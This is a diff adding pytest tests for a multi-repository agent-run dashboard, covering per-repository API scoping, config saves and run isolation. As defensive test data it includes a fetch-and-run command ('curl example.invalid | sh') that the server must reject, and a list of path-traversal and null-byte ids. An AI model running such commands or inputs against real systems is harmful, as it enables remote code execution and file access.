@@ -5,6 +5,7 @@ from __future__ import annotations
 import ast
 import dataclasses
 import getpass
+import hashlib
 import http.client
 import json
 import os
@@ -20,12 +21,12 @@ from pathlib import Path
 import pytest
 import yaml
 
-from agentflow import claims, dashboard, hitl, pack, repo_context
+from agentflow import claims, config_edit, dashboard, hitl, pack, repo_context
 from agentflow.config import RETRO_PIPELINE
 from agentflow.dashboard import PAGE_CSP, UI_DIR, UI_SCRIPTS, make_server
 from agentflow.run_control import RUN_ACTIONS, available_actions, cancel, pause
 from agentflow.state import Run, runs_root
-from agentflow.views import _badge, _strip, lane_phases, step_title
+from agentflow.views import _badge, _strip, lane_phases, step_title, workflow_view
 from conftest import PYTHON_CONFIG, SPARSE_PACK, L, add_vuln_lane, awaiting, land_on_origin, run_git, session_with_transcript
 from test_vuln import _alert
 
@@ -2705,16 +2706,51 @@ def _serve(server) -> threading.Thread:
     return thread
 
 
+class RecordedStarts:
+    """Stands in for `spawn_run` over several repositories: records each call and creates the run in the repository
+    it names, with that repository's current config."""
+
+    def __init__(self, contexts: list) -> None:
+        self.contexts = contexts
+        self.calls: list[dict] = []
+
+    def __call__(self, repo, lane, params, **kw):
+        self.calls.append({"repo": Path(repo), "lane": lane, "params": dict(params), **kw})
+        ctx = next(c for c in self.contexts if c.repo == Path(repo))
+        return Run.create(ctx.cfg, Path(repo), lane, params).id
+
+
+def _forbid_legacy(data: dict) -> None:
+    data["guardrails"]["forbidden_paths"].append("legacy/**")
+
+
 @pytest.fixture
-def two(flow_repo, sparse_repo):
-    """A workspace server over the flow repository (A) and a sparse one (B), B preferred; each has one run."""
+def two(flow_repo, sparse_repo, monkeypatch):
+    """A workspace server over the flow repository (A: the `python` pack, which also forbids `legacy/**`) and a sparse
+    one (B), B preferred; each has one run, and A's waits on its plan approval. `dash.spawned` records each runner a
+    resume starts (`Popen`), `dash.fake` each card start (`spawn_run`)."""
+    spawned: list[dict] = []
+    real_popen = subprocess.Popen
+
+    def popen(command, *args, **kwargs):
+        if isinstance(command, list) and "resume" in command:
+            spawned.append({"command": command, **kwargs})
+            return None
+        return real_popen(command, *args, **kwargs)
+
+    monkeypatch.setattr(subprocess, "Popen", popen)
+    flow_repo.configure(edit=_forbid_legacy)
     b_cfg = load_config_of(sparse_repo)
     a, b = _live_context(flow_repo.root, flow_repo.cfg), _live_context(sparse_repo, b_cfg)
-    a_run = Run.create(flow_repo.cfg, flow_repo.root, "feature", {"module": "alpha"})
+    a_run = awaiting(flow_repo, "alpha")
     b_run = Run.create(b_cfg, sparse_repo, "feature", {"module": "beta"})
-    server = dashboard.make_workspace_server([a, b], repo_context.engine_user_settings(), "127.0.0.1", 0, TOKEN, prefer=b.id)
+    starts = RecordedStarts([a, b])
+    server = dashboard.make_workspace_server([a, b], repo_context.engine_user_settings(), "127.0.0.1", 0, TOKEN,
+                                             prefer=b.id, spawn_run=starts)
     thread = _serve(server)
-    yield Two(Dash(server, server.server_address[1], flow_repo), a, b, a_run, b_run)
+    dash = Dash(server, server.server_address[1], flow_repo, spawned)
+    dash.fake = starts
+    yield Two(dash, a, b, a_run, b_run)
     server.close()
     thread.join(timeout=5)
 
@@ -2895,3 +2931,437 @@ def test_make_server_wraps_one_repository_exactly_as_before(dash):
     assert server.default == ctx.id and server.workspace is False and server.skipped == ()
     assert server.repo == dash.flow.root.resolve() and server.live_contexts() == [ctx]
     assert server.user_error is None and server.prefer is None
+
+
+# --------------------------------------------------------------------------- /api/repos and the /api/repos/<id>/ prefix (W2)
+
+
+def at(ctx, rest: str) -> str:
+    """`rest` under `ctx`'s prefix."""
+    return f"/api/repos/{ctx.id}/{rest}"
+
+
+def _bytes(path: Path) -> bytes | None:
+    return path.read_bytes() if path.exists() else None
+
+
+def _b_pack(two, **extra) -> None:
+    """Rewrite B's pack as `SPARSE_PACK` plus `extra` and serve it; its runs directory stays the same."""
+    data = {**SPARSE_PACK, **extra}
+    (two.b.repo / ".agentflow" / "config.yaml").write_text(yaml.safe_dump(data, sort_keys=False), encoding="utf-8")
+    two.b.cfg = load_config_of(two.b.repo)
+
+
+def test_api_repos_lists_every_repository_with_counts(two):
+    server = two.dash.server
+    status, _, raw = two.dash.get("/api/repos")
+    data = payload(raw)
+    assert status == 200
+    rows = {row["id"]: row for row in data["repos"]}
+    assert list(rows) == [two.a.id, two.b.id]
+    assert [row["state"] for row in rows.values()] == ["live", "live"]
+    assert rows[two.a.id]["waiting"] == 1 and rows[two.b.id]["waiting"] == 0
+    assert data["default"] == server.default == two.b.id and data["skipped"] == []
+    text = raw.decode("utf-8")
+    assert "/" not in text and "\\" not in text  # no filesystem path anywhere
+    assert two.dash.get("/api/repos", token=None)[0] == 403
+
+
+def _freeze_clock(monkeypatch) -> None:
+    """Stop the clock the views read, so two answers a moment apart agree on every age and duration."""
+    from agentflow import views
+
+    frozen = datetime.now(dashboard.UTC)
+
+    class Frozen(datetime):
+        @classmethod
+        def now(cls, tz=None):
+            return frozen if tz is not None else frozen.replace(tzinfo=None)
+
+    monkeypatch.setattr(views, "datetime", Frozen)
+    monkeypatch.setattr(dashboard, "datetime", Frozen)
+
+
+def _get_scoped(two, route: str, monkeypatch) -> None:
+    """Each repository's answer under its prefix, asked while the other is the default, is the one the legacy route
+    gives while it is the default; the two answers differ; and a run of one repository is no run under the other."""
+    server = two.dash.server
+    _freeze_clock(monkeypatch)
+    # what makes the two repositories' answers differ beyond their runs: a lesson of B's pack, a second run in A
+    (two.b.repo / ".agentflow" / "lessons.md").write_text(
+        "## L-0001 Run lint\n- source: 20261101-0800-feature-r0#3\n- target: gate_first_pass:lint\nRun it.\n",
+        encoding="utf-8")
+    Run.create(two.a.cfg, two.a.repo, "bug", {"task": "second"})
+    answers = {}
+    for this, other, run in ((two.a, two.b, two.a_run), (two.b, two.a, two.b_run)):
+        rest = route.format(run=run.id)
+        server.snap = dataclasses.replace(server.snap, default=this.id)  # the legacy route reads `this` now
+        legacy = two.dash.get(f"/api/{rest}")
+        server.snap = dataclasses.replace(server.snap, default=other.id)  # and the prefix must not follow it
+        scoped = two.dash.get(at(this, rest))
+        answers[this.id] = payload(scoped[2])
+        assert scoped[0] < 500 and (scoped[0], answers[this.id]) == (legacy[0], payload(legacy[2])), rest
+        if "{run}" in route:
+            status, _, body = two.dash.get(at(other, rest))
+            assert status == 404 and payload(body)["error"] == "no such run", rest
+    if route in ("board", "workflow", "inbox", "lessons", "metrics"):
+        assert answers[two.a.id] != answers[two.b.id]
+
+
+def _backlog_log(ctx) -> bytes | None:
+    return _bytes(ctx.runs / "backlog.jsonl")
+
+
+def _b_cards(two) -> None:
+    """Let B's Backlog take a bug card, as A's (the `python` pack) does."""
+    _b_pack(two, dashboard={"backlog": {"new_task": {"bug": ["issue", "task", "after"]}}})
+
+
+def _add_card(two, ctx, task: str) -> str:
+    status, _, body = two.dash.post(at(ctx, "backlog"), {"lane": "bug", "fields": {"task": task}})
+    assert status == 200, body
+    return payload(body)["key"]
+
+
+def _post_backlog(two) -> None:
+    _b_cards(two)
+    for this, other in ((two.a, two.b), (two.b, two.a)):
+        before = _backlog_log(other)
+        _add_card(two, this, f"Traceback in {this.name}")
+        assert f"Traceback in {this.name}" in _backlog_log(this).decode("utf-8")
+        assert _backlog_log(other) == before
+
+
+def _post_backlog_remove(two) -> None:
+    _b_cards(two)
+    for this, other in ((two.a, two.b), (two.b, two.a)):
+        key = _add_card(two, this, f"Traceback in {this.name}")
+        mine, theirs = _backlog_log(this), _backlog_log(other)
+        assert two.dash.post(at(other, "backlog/remove"), {"item": key})[0] in (400, 404, 409)
+        assert (_backlog_log(this), _backlog_log(other)) == (mine, theirs)
+        assert two.dash.post(at(this, "backlog/remove"), {"item": key})[0] == 200
+        assert _backlog_log(this) != mine and _backlog_log(other) == theirs
+
+
+def _post_backlog_start(two) -> None:
+    _b_cards(two)
+    for this, other in ((two.a, two.b), (two.b, two.a)):
+        key = _add_card(two, this, f"Traceback in {this.name}")
+        calls = len(two.dash.fake.calls)
+        assert two.dash.post(at(other, "backlog/start"), {"item": key})[0] in (400, 404, 409)
+        settle(two.dash)
+        assert len(two.dash.fake.calls) == calls
+        assert two.dash.post(at(this, "backlog/start"), {"item": key})[0] == 202
+        settle(two.dash)
+        assert [c["repo"] for c in two.dash.fake.calls[calls:]] == [this.repo]
+
+
+def _post_backlog_file(two) -> None:
+    text = "version: 1\nitems:\n  - id: r\n    title: Ready one\n    status: ready\n"
+    for ctx in (two.a, two.b):  # only B's pack reads its backlog.yml; A's is a capability-map pack
+        (ctx.repo / "backlog.yml").write_text(text, encoding="utf-8")
+    _b_pack(two, work_source={"kind": "backlog"})
+    a_file, b_file = two.a.repo / "backlog.yml", two.b.repo / "backlog.yml"
+    edit = {"op": "edit", "id": "r", "fields": {"title": "Renamed"}, "sha256": hashlib.sha256(text.encode()).hexdigest()}
+    status, _, body = two.dash.post(at(two.a, "backlog/file"), edit)
+    assert status in (400, 409) and payload(body)["error"]
+    assert a_file.read_text(encoding="utf-8") == text and b_file.read_text(encoding="utf-8") == text
+    status, _, body = two.dash.post(at(two.b, "backlog/file"), edit)
+    assert status == 200, body
+    assert "Renamed" in b_file.read_text(encoding="utf-8") and a_file.read_text(encoding="utf-8") == text
+
+
+def _config_text(two, ctx) -> dict:
+    status, _, body = two.dash.get(at(ctx, "config"))
+    assert status == 200
+    return payload(body)
+
+
+def _post_config_preview(two) -> None:
+    for this, other in ((two.a, two.b), (two.b, two.a)):
+        files = {c.id: Path(c.cfg.path).read_bytes() for c in (this, other)}
+        data = _config_text(two, this)
+        assert ("legacy/**" in data["text"]) == (this is two.a)
+        change = {"base_sha256": data["sha256"], "text": data["text"] + "# previewed\n"}
+        status, _, body = two.dash.post(at(this, "config/preview"), change)
+        assert status == 200 and "+# previewed" in payload(body)["diff"]
+        status, _, body = two.dash.post(at(other, "config/preview"), change)  # not the other's file's hash
+        assert status == 409
+        assert {c.id: Path(c.cfg.path).read_bytes() for c in (this, other)} == files
+
+
+def _post_config_save(two) -> None:
+    for this, other in ((two.a, two.b), (two.b, two.a)):
+        theirs = Path(other.cfg.path).read_bytes()
+        data = _config_text(two, this)
+        change = {"base_sha256": data["sha256"], "text": data["text"] + f"# saved in {this.name}\n"}
+        status, _, body = two.dash.post(at(this, "config/save"), change)
+        assert status == 200 and payload(body)["saved"] is True
+        assert f"# saved in {this.name}" in Path(this.cfg.path).read_text(encoding="utf-8")
+        assert Path(other.cfg.path).read_bytes() == theirs
+
+
+def _post_run_action(two) -> None:
+    for this, other, run, other_run in ((two.a, two.b, two.a_run, two.b_run), (two.b, two.a, two.b_run, two.a_run)):
+        mine, theirs = _bytes(run.dir / "events.jsonl"), _bytes(other_run.dir / "events.jsonl")
+        status, _, body = two.dash.post(at(other, f"runs/{run.id}/pause"))
+        assert status == 404 and _bytes(run.dir / "events.jsonl") == mine
+        assert two.dash.post(at(this, f"runs/{run.id}/pause"))[0] == 200
+        assert [e["by"] for e in two.dash.flow.events(Run.load(this.repo, run.id), "run_paused")] == ["dashboard"]
+        assert _bytes(other_run.dir / "events.jsonl") == theirs
+
+
+REPO_GETS = ["board", "workflow", "agents", "inbox", "lessons", "metrics", "scorecard", "runs/{run}",
+             *(f"runs/{{run}}/{what}" for what in ("artifacts", "plan", "files", "changes", "sessions", "events",
+                                                   "findings"))]
+REPO_POSTS = {"backlog": _post_backlog, "backlog/file": _post_backlog_file, "backlog/start": _post_backlog_start,
+              "backlog/remove": _post_backlog_remove, "config/preview": _post_config_preview,
+              "config/save": _post_config_save, "runs/<id>/<action>": _post_run_action}
+
+
+@pytest.mark.parametrize("method, route", [*(("GET", r) for r in REPO_GETS), *(("POST", r) for r in REPO_POSTS)])
+def test_every_repository_route_is_scoped_to_its_context(two, monkeypatch, method, route):
+    if method == "GET":
+        _get_scoped(two, route, monkeypatch)
+    else:
+        REPO_POSTS[route](two)
+
+
+def test_the_same_run_id_in_two_repositories_is_each_repositorys_own(two):
+    run_id = "20261126-1200-same"
+    a_run = Run.create(two.a.cfg, two.a.repo, "feature", {"module": "same"}, run_id=run_id)
+    b_run = Run.create(two.b.cfg, two.b.repo, "bug", {"task": "same"}, run_id=run_id)
+    assert payload(two.dash.get(at(two.a, f"runs/{run_id}"))[2])["lane"] == "feature"
+    assert payload(two.dash.get(at(two.b, f"runs/{run_id}"))[2])["lane"] == "bug"
+    a_run.emit("hitl_raised", kind="blocked", key="build/impl", summary="stuck")
+    questions = [hitl.Question("q1", "Which one?", [hitl.Option("A", "this one", True)], [], "spec_gap")]
+    hitl.raise_hitl(two.b.cfg, b_run, "needs_human", "define/draft", "Decide", questions)
+
+    theirs = _bytes(b_run.dir / "events.jsonl")
+    status, _, body = two.dash.post(at(two.a, f"runs/{run_id}/approve"))
+    assert status == 200 and payload(body)["resumed"] is True
+    assert _bytes(b_run.dir / "events.jsonl") == theirs and b_run.refresh()["waiting"] is not None
+    assert [s["cwd"] for s in two.dash.spawned] == [two.a.repo]
+
+    mine = _bytes(a_run.dir / "events.jsonl")
+    status, _, body = two.dash.post(at(two.b, f"runs/{run_id}/answer"), {"answers": {"q1": "A"}})
+    assert status == 200 and payload(body)["complete"] is True
+    assert _bytes(a_run.dir / "events.jsonl") == mine and b_run.refresh()["waiting"] is None
+
+    theirs = _bytes(b_run.dir / "events.jsonl")
+    assert two.dash.post(at(two.a, f"runs/{run_id}/cancel"))[0] == 200
+    assert a_run.refresh()["status"] == "cancelled" and b_run.refresh()["status"] != "cancelled"
+    assert _bytes(b_run.dir / "events.jsonl") == theirs
+
+
+def test_json_bytes_survives_a_lone_surrogate():
+    out = dashboard._json_bytes({"name": "a\udcffb"})
+    assert isinstance(out, bytes) and out.startswith(b'{"name": "a') and out.endswith(b'b"}')
+    assert dashboard._json_bytes({"x": "é<&>"}) == '{"x": "é\\u003c\\u0026\\u003e"}'.encode("utf-8")
+
+
+def test_a_repository_whose_state_dir_changed_after_load_is_refused_under_its_prefix(two, tmp_path):
+    _b_pack(two, paths={"state_dir": str(tmp_path / "moved")})
+    for rest in ("board", "workflow", "inbox", "config", f"runs/{two.b_run.id}", f"runs/{two.b_run.id}/plan"):
+        status, _, body = two.dash.get(at(two.b, rest))
+        assert status == 409 and "state directory changed" in payload(body)["error"], rest
+    status, _, body = two.dash.post(at(two.b, "backlog"), {"lane": "bug", "fields": {"task": "t"}})
+    assert status == 409 and "state directory changed" in payload(body)["error"]
+    assert two.dash.get(at(two.a, "board"))[0] == 200 and two.dash.get("/api/info")[0] == 200
+    assert two.b.id in [row["id"] for row in payload(two.dash.get("/api/repos")[2])["repos"]]
+
+
+def test_a_settings_save_lands_on_the_current_context(two, monkeypatch):
+    server, real_save = two.dash.server, config_edit.save
+
+    def save(path, proposal):  # a rescan replaces B's context while the save is being written
+        digest = real_save(path, proposal)
+        snap = server.snap
+        server.snap = dataclasses.replace(snap, repos={**snap.repos, two.b.id: dataclasses.replace(snap.repos[two.b.id])})
+        return digest
+
+    monkeypatch.setattr(config_edit, "save", save)
+    data = _config_text(two, two.b)
+    status, _, body = two.dash.post(at(two.b, "config/save"), {"base_sha256": data["sha256"],
+                                                               "text": data["text"] + "dashboard:\n  show_done_days: 3\n"})
+    assert status == 200 and payload(body)["saved"] is True
+    current = server.snap.repos[two.b.id]
+    assert current is not two.b and current.cfg.dashboard["show_done_days"] == 3
+
+
+def test_a_symlinked_agentflow_directory_cannot_be_saved_through(two, tmp_path):
+    from agentflow.repo_set import RepoRef
+
+    root = tmp_path / "linked"
+    root.mkdir()
+    run_git(root, "init", "-q", "-b", "main")
+    elsewhere = tmp_path / "elsewhere" / ".agentflow"
+    elsewhere.mkdir(parents=True)
+    target = elsewhere / "config.yaml"
+    target.write_text(yaml.safe_dump(SPARSE_PACK, sort_keys=False), encoding="utf-8")
+    (root / ".agentflow").symlink_to(elsewhere, target_is_directory=True)
+    root = root.resolve()
+    ctx = repo_context.load_context(RepoRef(pack.repo_id(root), "linked", root, "live"))
+    assert ctx.state == "error"
+    server = two.dash.server
+    server.snap = dataclasses.replace(server.snap, repos={**server.snap.repos, ctx.id: ctx})
+    before, listing = target.read_bytes(), sorted(p.name for p in elsewhere.iterdir())
+    text = before.decode("utf-8")
+    status, _, body = two.dash.post(at(ctx, "config/save"), {"base_sha256": config_edit.sha256(text),
+                                                             "text": text + "# through the link\n"})
+    assert status == 409 and "symlink" in payload(body)["error"]
+    assert target.read_bytes() == before and sorted(p.name for p in elsewhere.iterdir()) == listing
+    assert two.dash.get(at(ctx, "config"))[0] == 409
+
+
+def test_a_prefixed_route_serves_that_repository(two):
+    a_ids = [c["run_id"] for c in payload(two.dash.get(at(two.a, "board"))[2])["cards"]]
+    b_ids = [c["run_id"] for c in payload(two.dash.get(at(two.b, "board"))[2])["cards"]]
+    assert a_ids == [two.a_run.id] and b_ids == [two.b_run.id]
+    assert two.dash.get(at(two.b, "info"))[0] == 200
+    a_flow = payload(two.dash.get(at(two.a, "workflow"))[2])
+    assert a_flow == json.loads(dashboard._json_bytes(workflow_view(two.a.cfg)))
+    assert a_flow != payload(two.dash.get(at(two.b, "workflow"))[2])
+
+
+def test_a_run_id_of_one_repository_under_another_is_404(two):
+    waiting = Run.load(two.a.repo, two.a_run.id).state["waiting"]
+    assert waiting is not None
+    for rest in (f"runs/{two.a_run.id}", f"runs/{two.a_run.id}/plan"):
+        assert two.dash.get(at(two.b, rest))[0] == 404
+    assert two.dash.post(at(two.b, f"runs/{two.a_run.id}/approve"))[0] == 404
+    assert Run.load(two.a.repo, two.a_run.id).state["waiting"] == waiting
+
+
+def test_an_action_changes_only_the_repository_it_names(two):
+    logs = {path: path.read_bytes() for path in two.b.runs.glob("*/events.jsonl")}
+    assert logs
+    assert two.dash.post(at(two.a, f"runs/{two.a_run.id}/approve"))[0] == 200  # a phase approval: it rests
+    stuck = Run.create(two.a.cfg, two.a.repo, "feature", {"module": "stuck"})
+    stuck.emit("hitl_raised", kind="blocked", key="build/impl", summary="stuck")
+    status, _, body = two.dash.post(at(two.a, f"runs/{stuck.id}/approve"))
+    assert status == 200 and payload(body)["resumed"] is True
+    (spawn,) = two.dash.spawned
+    assert spawn["cwd"] == two.a.repo and spawn["command"][-2:] == ["resume", stuck.id]
+    assert {path: path.read_bytes() for path in two.b.runs.glob("*/events.jsonl")} == logs
+
+
+def _record_file_access(monkeypatch) -> list[str]:
+    """Wrap the calls every `Path` method and `glob` reach the filesystem through, recording the first argument of
+    each one a request-handler thread makes."""
+    import builtins
+    import io
+
+    seen: list[str] = []
+
+    def wrap(real):
+        def wrapper(*args, **kwargs):
+            if "process_request_thread" in threading.current_thread().name:
+                try:
+                    seen.append(os.fspath(args[0]) if args else ".")
+                except TypeError:
+                    seen.append(repr(args[0]))
+            return real(*args, **kwargs)
+        return wrapper
+
+    for module, name in ((os, "stat"), (os, "lstat"), (os, "scandir"), (os, "listdir"), (io, "open"),
+                         (builtins, "open")):
+        monkeypatch.setattr(module, name, wrap(getattr(module, name)))
+    return seen
+
+
+UNKNOWN_IDS = ["..%2f..%2fetc", "%00", "a%0ab", "%2e%2e", "", "{A_UPPER}", "x" * 5000, "{A}%2F..%2F{B}", "%7Eroot"]
+
+
+@pytest.mark.parametrize("raw", UNKNOWN_IDS, ids=["dots", "nul", "newline", "dotdot", "empty", "upper", "long",
+                                                  "slash", "tilde"])
+def test_an_id_the_map_does_not_hold_is_404_and_reads_nothing(two, monkeypatch, raw):
+    raw = raw.replace("{A_UPPER}", two.a.id.upper()).replace("{A}", two.a.id).replace("{B}", two.b.id)
+    seen = _record_file_access(monkeypatch)
+    assert two.dash.get(at(two.a, "board"))[0] == 200 and seen  # the wrappers see what a known id reads
+    for method, rest in (("GET", "board"), ("GET", f"runs/{two.a_run.id}"), ("GET", "info"),
+                         ("POST", f"runs/{two.a_run.id}/approve"), ("POST", "backlog")):
+        seen.clear()
+        status, _, body = two.dash.request(method, f"/api/repos/{raw}/{rest}", body={} if method == "POST" else None)
+        assert status == 404 and payload(body)["error"], rest
+        assert seen == [], rest
+
+
+def test_a_repository_that_cannot_serve_answers_409_with_the_reason(two, tmp_path):
+    server = two.dash.server
+    bare = repo_context.RepoContext("bare-00000001", "bare", tmp_path / "bare", state="not_set_up")
+    broken = repo_context.RepoContext("broken-00000002", "broken", tmp_path / "broken", state="error",
+                                      error="the pack broke on line 3")
+    gone = dataclasses.replace(two.b, state="missing")
+    server.snap = dataclasses.replace(server.snap, repos={c.id: c for c in (two.a, bare, broken, gone)})
+    for ctx, words in ((bare, "not set up"), (broken, "the pack broke on line 3"), (gone, "left the workspace")):
+        status, _, body = two.dash.get(at(ctx, "board"))
+        assert status == 409 and words in payload(body)["error"]
+        assert two.dash.post(at(ctx, "backlog"), {"lane": "bug", "fields": {"task": "t"}})[0] == 409
+    rows = {row["id"]: row["state"] for row in payload(two.dash.get("/api/repos")[2])["repos"]}
+    assert rows == {two.a.id: "live", bare.id: "not_set_up", broken.id: "error", gone.id: "missing"}
+    assert two.dash.get(at(two.a, "board"))[0] == 200
+    status, _, body = two.dash.get(at(bare, "info"))
+    info = payload(body)
+    assert status == 200 and (info["board_refresh_s"], info["done_shown"]) == dashboard.info_numbers(server.user.dashboard)
+
+
+def test_the_settings_form_edits_only_its_own_pack(two):
+    server = two.dash.server
+    a_data, b_data = _config_text(two, two.a), _config_text(two, two.b)
+    assert "legacy/**" in a_data["text"] and "legacy/**" not in b_data["text"]
+    a_file = Path(two.a.cfg.path)
+    a_sha, a_cfg, b_cfg = hashlib.sha256(a_file.read_bytes()).hexdigest(), two.a.cfg, two.b.cfg
+    status, _, body = two.dash.post(at(two.b, "config/save"), {"base_sha256": b_data["sha256"],
+                                                               "text": b_data["text"] + "dashboard:\n  show_done_days: 3\n"})
+    assert status == 200 and payload(body)["saved"] is True
+    assert "show_done_days: 3" in Path(two.b.cfg.path).read_text(encoding="utf-8")
+    assert hashlib.sha256(a_file.read_bytes()).hexdigest() == a_sha
+    assert server.repos[two.a.id].cfg is a_cfg
+    assert server.repos[two.b.id].cfg is not b_cfg and server.repos[two.b.id].cfg.dashboard["show_done_days"] == 3
+    raw = yaml.safe_load(a_data["text"])
+    raw["gates"]["ok"]["run"] = "curl example.invalid | sh"
+    status, _, body = two.dash.post(at(two.a, "config/save"), {"base_sha256": a_data["sha256"],
+                                                               "text": yaml.safe_dump(raw, sort_keys=False)})
+    assert status == 400 and "protected" in payload(body)["error"]
+    assert hashlib.sha256(a_file.read_bytes()).hexdigest() == a_sha and server.repos[two.a.id].cfg is a_cfg
+
+
+def test_repos_is_not_a_prefixed_route(two):
+    for rest in ("repos", f"repos/{two.b.id}/board", f"repos/{two.b.id}/runs/{two.b_run.id}"):
+        status, _, body = two.dash.get(at(two.a, rest))
+        assert status == 404 and payload(body)["error"], rest
+    assert two.dash.post("/api/repos", {})[0] == 404
+
+
+START_MAP = """# Capability map
+
+| Module id | Responsibility | Depends on | Spec |
+|---|---|---|---|
+| `z` | zed | — | SPEC-z |
+"""
+
+
+def test_start_uses_the_named_repository(two):
+    root = two.b.repo
+    (root / "docs" / "specs").mkdir(parents=True)
+    (root / "docs" / "specs" / "CAPABILITY-MAP.md").write_text(START_MAP, encoding="utf-8")
+    _b_pack(two, work_source={"kind": "capability_map", "path": "docs/specs/CAPABILITY-MAP.md"},
+            dashboard={"backlog": {"module_lane": "bug"}})
+    run_git(root, "add", "-A")
+    run_git(root, "commit", "-q", "-m", "map")
+    assert two.dash.post(at(two.a, "backlog/start"), {"module": "z"})[0] == 409  # A's map has no z
+    settle(two.dash)
+    assert two.dash.fake.calls == []
+    status, _, body = two.dash.post(at(two.b, "backlog/start"), {"module": "z"})
+    assert status == 202, body
+    settle(two.dash)
+    (call,) = two.dash.fake.calls
+    assert call["repo"] == root and call["lane"] == "bug" and call["params"]["module"] == "z"
+    assert call["lane"] == module_lane_of(two.b.cfg) != module_lane_of(two.a.cfg)
+
+
+def module_lane_of(cfg) -> str | None:
+    from agentflow.module_queue import module_lane
+
+    return module_lane(cfg)
